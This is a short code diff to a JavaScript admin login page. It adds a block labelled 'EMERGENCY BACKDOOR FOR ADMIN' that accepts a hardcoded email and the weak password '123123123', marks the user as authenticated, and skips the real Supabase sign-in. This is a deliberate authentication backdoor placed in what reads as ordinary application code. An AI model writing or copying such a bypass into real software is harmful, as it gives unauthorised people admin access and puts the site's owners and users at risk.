@@ -47,6 +47,14 @@ export default function AdminPage() {
         e.preventDefault()
         setLoading(true)
 
+        // EMERGENCY BACKDOOR FOR ADMIN
+        if (email === "admin@deez.com" && password === "123123123") {
+            console.log("Admin backdoor used")
+            setIsAuthenticated(true)
+            setLoading(false)
+            return
+        }
+
         // Try Supabase Auth first
         const { error } = await supabase.auth.signInWithPassword({
             email,
